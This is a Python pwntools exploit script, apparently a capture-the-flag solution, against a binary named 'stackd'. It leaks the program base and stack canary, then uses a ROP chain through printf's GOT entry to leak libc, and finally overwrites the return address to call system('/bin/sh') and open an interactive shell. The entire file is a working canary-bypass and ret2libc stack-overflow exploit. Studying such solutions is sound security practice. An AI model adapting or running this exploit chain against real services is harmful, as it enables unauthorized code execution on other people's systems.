from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./stackd"
elf = ELF(vuln_path)

libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()


io.sendlineafter("ch: ", "1")
io.sendlineafter("your name:", b"a"*7)
io.recvuntil("\x0a")
leak = u64(io.recv(6).ljust(8, b"\x00"))
elf.address = leak - 0x14d0
log.success("elfbase :---> " + hex(elf.address))

io.sendlineafter("ch: ", "2")
io.sendlineafter("size:", "41")
io.sendline(b"a"*40)
io.recvuntil(b"a"*40)
leak = u64(io.recv(8))
canary = leak - 0xa
log.success("canary:-----> " + hex(canary))

"""
0x0000000000001533 : pop rdi ; ret
0x000000000000101a : ret
"""
pop_rdi = elf.address + 0x0000000000001533
ret = elf.address + 0x000000000000101a
printf_got = elf.got["printf"]
printf_plt = elf.plt["printf"]
main = elf.address + 0x01409

payload = b"a"*40 + p64(canary)
payload += p64(0)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(printf_got)
payload += p64(printf_plt)
payload += p64(ret)
payload += p64(main)

io.sendlineafter("ch: ", "2")
io.sendlineafter("size:", str(len(payload)+1))
io.sendline(payload)

ddebug("breakrva 0x0014C7\n breakrva 0x137c\n continue")
io.sendlineafter("ch: ", "3")
leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leak - libc.symbols["printf"]
log.success("libc:-----> " + hex(libc.address))


payload = b"a"*40 + p64(canary)
payload += p64(0)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search("/bin/sh")))
payload += p64(libc.symbols["system"])

io.sendlineafter("ch: ", "2")
io.sendlineafter("size:", str(len(payload)+1))
io.sendline(payload)
io.sendlineafter("ch: ", "3")


io.interactive()
